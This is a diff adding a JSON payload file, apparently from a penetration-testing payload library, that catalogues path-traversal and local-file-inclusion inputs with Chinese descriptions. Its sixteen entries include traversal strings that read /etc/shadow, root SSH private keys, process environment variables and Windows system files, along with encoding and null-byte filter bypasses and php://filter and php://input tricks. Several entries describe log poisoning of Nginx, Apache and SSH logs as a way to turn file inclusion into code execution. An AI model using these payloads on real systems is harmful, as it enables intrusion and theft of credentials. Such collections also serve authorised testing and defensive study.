@@ -1,0 +1,184 @@
+{
+  "kind": "payload",
+  "version": 1,
+  "group": "路径穿越 / 任意文件读取",
+  "categories": ["Linux 系统", "Windows 系统", "编码绕过", "应用文件", "日志与配置"],
+  "items": [
+    {
+      "id": "lfi-passwd",
+      "title": "读取 /etc/passwd",
+      "category": "Linux 系统",
+      "code": "../../../../../../etc/passwd",
+      "desc": "最基础的目录穿越，验证路径拼接是否可控。",
+      "tags": ["lfi", "linux", "basic"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP WSTG / PayloadsAllTheThings"
+    },
+    {
+      "id": "lfi-shadow",
+      "title": "读取 /etc/shadow",
+      "category": "Linux 系统",
+      "code": "../../../../../../etc/shadow",
+      "desc": "需要进程具备 root 权限才能读取，可验证命令执行后的权限。",
+      "tags": ["lfi", "linux", "shadow"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "lfi-ssh-key",
+      "title": "读取 SSH 私钥",
+      "category": "Linux 系统",
+      "code": "../../../../../../root/.ssh/id_rsa",
+      "desc": "若目标以 root 运行且存在密钥，可直接接管主机。",
+      "tags": ["lfi", "linux", "ssh"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "lfi-proc-self-environ",
+      "title": "读取进程环境变量",
+      "category": "Linux 系统",
+      "code": "../../../../../../proc/self/environ",
+      "desc": "环境变量中可能包含数据库口令、云凭证等敏感信息。",
+      "tags": ["lfi", "linux", "proc"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "lfi-proc-self-cmdline",
+      "title": "读取进程命令行",
+      "category": "Linux 系统",
+      "code": "../../../../../../proc/self/cmdline",
+      "desc": "获取当前进程启动参数，辅助判断应用路径与配置位置。",
+      "tags": ["lfi", "linux", "proc"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "lfi-win-boot",
+      "title": "Windows 读取 win.ini",
+      "category": "Windows 系统",
+      "code": "..\\..\\..\\..\\..\\..\\windows\\win.ini",
+      "desc": "Windows 下验证目录穿越的经典文件，多数系统均存在。",
+      "tags": ["lfi", "windows", "basic"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "lfi-win-hosts",
+      "title": "Windows 读取 hosts",
+      "category": "Windows 系统",
+      "code": "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "desc": "确认目标主机名与内网解析关系。",
+      "tags": ["lfi", "windows"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "lfi-url-encode",
+      "title": "URL 编码绕过",
+      "category": "编码绕过",
+      "code": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "desc": "对 ../ 进行 URL 编码，绕过简单的字符串过滤。",
+      "tags": ["lfi", "bypass", "encoding"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "lfi-double-encode",
+      "title": "双重 URL 编码",
+      "category": "编码绕过",
+      "code": "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+      "desc": "目标解码一次后再拼接时，使用双重编码可绕过过滤。",
+      "tags": ["lfi", "bypass", "encoding"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "lfi-null-byte",
+      "title": "空字节截断",
+      "category": "编码绕过",
+      "code": "../../../../../../etc/passwd%00",
+      "desc": "老版本 PHP（<5.3.4）可用空字节截断后缀，现代版本已修复。",
+      "tags": ["lfi", "legacy", "php", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PHP 历史漏洞文档"
+    },
+    {
+      "id": "lfi-php-filter",
+      "title": "php://filter 读源码",
+      "category": "应用文件",
+      "code": "php://filter/convert.base64-encode/resource=index.php",
+      "desc": "通过 PHP 过滤器把源码 Base64 编码后输出，避免被当作 PHP 执行。",
+      "tags": ["lfi", "php", "filter", "source"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PHP 官方文档 php://filter"
+    },
+    {
+      "id": "lfi-php-input",
+      "title": "php://input 包含",
+      "category": "应用文件",
+      "code": "php://input",
+      "desc": "若 allow_url_include 开启，可将 POST 体作为 PHP 代码包含执行。",
+      "tags": ["lfi", "php", "rce"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PHP 官方文档"
+    },
+    {
+      "id": "lfi-nginx-log",
+      "title": "包含 Nginx 访问日志",
+      "category": "日志与配置",
+      "code": "../../../../../../var/log/nginx/access.log",
+      "desc": "配合 UA 写入 PHP 代码，包含日志即可执行，属于经典 LFI 到 RCE 手法。",
+      "tags": ["lfi", "nginx", "log", "rce"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "lfi-apache-log",
+      "title": "包含 Apache 访问日志",
+      "category": "日志与配置",
+      "code": "../../../../../../var/log/apache2/access.log",
+      "desc": "同 Nginx 日志包含思路，注意日志路径与权限。",
+      "tags": ["lfi", "apache", "log", "rce"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "lfi-ssh-auth-log",
+      "title": "包含 SSH 认证日志",
+      "category": "日志与配置",
+      "code": "../../../../../../var/log/auth.log",
+      "desc": "通过 SSH 用户名写入代码后包含日志执行。",
+      "tags": ["lfi", "ssh", "log", "rce"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "lfi-spring-config",
+      "title": "读取 Spring 配置",
+      "category": "日志与配置",
+      "code": "{{path}}",
+      "desc": "Spring Boot 生产配置常包含数据库与对象存储口令，默认示例为 application-prod.yml，需按实际路径调整。",
+      "tags": ["lfi", "spring", "config"],
+      "vars": [{ "name": "path", "label": "配置文件路径", "placeholder": "../../../../../../opt/app/config/application-prod.yml", "example": "../../../../../../opt/app/config/application-prod.yml" }],
+      "risk": "attack",
+      "source": "通用渗透测试经验"
+    }
+  ]
+}
